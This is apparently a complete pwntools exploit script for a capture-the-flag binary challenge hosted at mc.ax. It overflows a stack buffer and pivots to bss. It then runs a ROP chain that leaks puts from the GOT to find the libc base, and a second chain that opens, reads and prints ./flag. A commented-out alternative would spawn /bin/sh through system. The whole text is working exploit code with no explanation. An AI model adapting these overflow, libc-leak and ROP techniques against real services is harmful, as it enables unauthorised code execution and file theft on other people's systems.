from pwn import *

context.log_level = 'debug'
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("mc.ax", 30284)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


bss = 0x404040 + 0x600
pop_rdi = 0x401293
pop_rsi_r15 = 0x401291
putsplt = elf.plt['puts']
putsgot = elf.got['puts']
ret = 0x40101a

payload = b"a" * 0x30 + p64(bss)
payload += p64(pop_rdi) + p64(0x402004) + p64(0x401030) # puts str -> write putsgot table
payload += p64(pop_rdi) + p64(putsgot) + p64(putsplt)
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss + 0x50) + p64(0) + p64(
    0x401050) # read str -> write readgot table
payload += p64(0x4011BE)

io.sendlineafter("here!\n", payload)

libcbase_puts = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = libcbase_puts - libc.symbols['puts']
success("lib address -> " + hex(libc.address))

#payload = b"/bin/sh\x00".ljust(0x30, b"\x00") + p64(bss)
#payload += p64(pop_rdi) + p64(bss - 0x30) + p64(ret) + p64(libc.symbols["system"])
pop_rsi = roplibc.rsi.address + libc.address
pop_rdi = roplibc.rdi.address + libc.address
pop_rdx = roplibc.rdx.address + libc.address
payload = b"./flag\x00".ljust(0x30, b"\x00") + p64(bss)
payload += p64(pop_rdi) + p64(bss - 0x30) + p64(pop_rsi) + p64(0) + p64(libc.symbols["open"]) # open
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss + 0x50) + p64(pop_rdx) + p64(0x30) + p64(
    libc.symbols["read"]) # read
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss + 0x50) + p64(pop_rdx) + p64(0x30) + p64(
    libc.symbols["write"]) # write

io.sendlineafter("here!\n", payload)

#io.recvall()

io.interactive()
